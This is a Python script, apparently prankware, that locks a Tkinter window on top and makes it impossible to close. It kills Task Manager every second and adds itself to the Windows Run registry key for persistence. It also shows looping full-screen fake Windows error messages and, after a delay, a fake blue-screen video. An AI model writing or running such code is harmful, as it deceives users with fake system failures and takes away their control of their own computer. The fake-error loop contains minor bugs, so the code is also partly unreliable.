import tkinter as tk
import random
import threading
import psutil
import time
import pygame
import os
import cv2
from PIL import Image, ImageTk
import winreg

root = tk.Tk()
root.title("Самая неудобная программа")
root.geometry("500x500")
root.resizable(False, False)
root.attributes("-topmost", True)

def disable_close():
    pass

root.protocol("WM_DELETE_WINDOW", disable_close)

button_texts = ["Нажми меня!", "Кликни!", "Не трогай", "Вот это кнопка", "Странная кнопка", "Угадай функцию"]
random.shuffle(button_texts)

pygame.mixer.init()

current_directory = os.path.dirname(os.path.abspath(__file__))
sounds = [
    os.path.join(current_directory, 'sound1.wav'),
    os.path.join(current_directory, 'sound2.wav'),
    os.path.join(current_directory, 'sound3.wav')
]

def play_random_sound():
    if random.random() < 0.3:  # 30% шанс
        sound = random.choice(sounds)
        pygame.mixer.music.load(sound)
        pygame.mixer.music.play()

def random_function():
    new_text = random.choice(button_texts)
    label.config(text=f"Вы нажали: {new_text}")
    random.shuffle(button_texts)
    update_buttons()
    play_random_sound()

def close_program():
    label.config(text="Программа закрыта, но нет :)")
    play_random_sound()

def do_nothing():
    label.config(text="Вы ничего не сделали")
    play_random_sound()

button_functions = [random_function, close_program, do_nothing]

label = tk.Label(root, text="Выберите действие")
label.pack(pady=20)

def update_buttons():
    for i in range(3):
        buttons[i].config(text=button_texts[i])

buttons = []
for i in range(3):
    btn = tk.Button(root, text=button_texts[i], command=random.choice(button_functions))
    btn.place(x=random.randint(0, 400), y=random.randint(0, 400))
    buttons.append(btn)

update_buttons()

def on_minimize(event):
    if root.state() == 'iconic':
        root.state('normal')
        play_random_sound()

root.bind("<Unmap>", on_minimize)

label_instruction = tk.Label(root, text="Чтобы закрыть, нажмите Ctrl + C в терминале")
label_instruction.pack(side="bottom")

def show_error_message():
    error_messages = [
        "Системная ошибка: Невозможно найти файл.\nНажмите ОК для продолжения.",
        "Ошибка: Неправильный доступ к памяти.\nПерезагрузка системы может помочь.",
        "Внимание: Приложение зависло.\nПожалуйста, перезапустите.",
        "Ошибка 0x80070057: Неверные параметры.\nПопробуйте снова.",
        "Ошибка 0xC0000005: Нарушение прав доступа.\nОбратитесь в техническую поддержку.",
        "Ошибка: Непредвиденное завершение программы.\nСохраните свою работу."
    ]
    while True:
        msg = random.choice(error_messages)
        error_window = tk.Toplevel(root)
        error_window.title("Ошибка Windows")
        error_window.attributes('-fullscreen', True)
        error_window.attributes("-topmost", True)
        error_window.config(bg="black")

        label = tk.Label(error_window, text=msg, wraplength=800, justify="center", fg="red", bg="black", font=("Arial", 20))
        label.pack(expand=True)

        button = tk.Button(error_window, text="ОК", command=error_window.destroy)
        button.pack(pady=10)

        error_window.after(2000, error_window.withdraw())
        error_window.after(2500, error_window.destroy)
        
        error_window.update_idletasks()
        error_window.deiconify()
        
        for _ in range(10):
            error_window.geometry(f"+{random.randint(-5, 5)}+{random.randint(-5, 5)}")
            root.update()
            time.sleep(0.05)

        time.sleep(3)

def animate_buttons():
    while True:
        for btn in buttons:
            current_x = btn.winfo_x()
            current_y = btn.winfo_y()
            delta_x = random.randint(-5, 5)
            delta_y = random.randint(-5, 5)
            new_x = current_x + delta_x
            new_y = current_y + delta_y
            if new_x < -100 or new_x > 500 or new_y < -100 or new_y > 500:
                fall_down(btn, current_x, current_y)
            else:
                btn.place(x=new_x, y=new_y)
        root.update()
        root.after(50)

def fall_down(btn, x, y):
    for _ in range(50):
        y += 5
        btn.place(x=x, y=y)
        root.update()
        root.after(20)

def terminate_task_manager():
    while True:
        for proc in psutil.process_iter():
            if proc.name().lower() == 'taskmgr.exe':
                proc.terminate()
        time.sleep(1)

def show_blue_screen():
    time.sleep(70)
    blue_screen_window = tk.Toplevel(root)
    blue_screen_window.attributes('-fullscreen', True)
    blue_screen_window.attributes("-topmost", True)

    video_path = os.path.join(current_directory, 'blue_screen_video.mp4')
    
    if os.path.exists(video_path):
        cap = cv2.VideoCapture(video_path)
        label = tk.Label(blue_screen_window)
        label.pack(fill=tk.BOTH, expand=True)

        def update_frame():
            ret, frame = cap.read()
            if ret:
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame)
                imgtk = ImageTk.PhotoImage(image=img)
                label.imgtk = imgtk
                label.configure(image=imgtk)
                label.after(10, update_frame)
            else:
                cap.release()
                blue_screen_window.destroy()

        update_frame()

    def close_blue_screen(event):
        cap.release()
        blue_screen_window.destroy()

    blue_screen_window.bind("<Escape>", close_blue_screen)

    blue_screen_window.mainloop()

def add_to_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Самая неудобная программа", 0, winreg.REG_SZ, os.path.abspath(__file__))
    winreg.CloseKey(key)

add_to_startup()

animation_thread = threading.Thread(target=animate_buttons)
animation_thread.daemon = True
animation_thread.start()

task_manager_thread = threading.Thread(target=terminate_task_manager)
task_manager_thread.daemon = True
task_manager_thread.start()

error_thread = threading.Thread(target=show_error_message)
error_thread.daemon = True
error_thread.start()

blue_screen_thread = threading.Thread(target=show_blue_screen)
blue_screen_thread.daemon = True
blue_screen_thread.start()

root.mainloop()
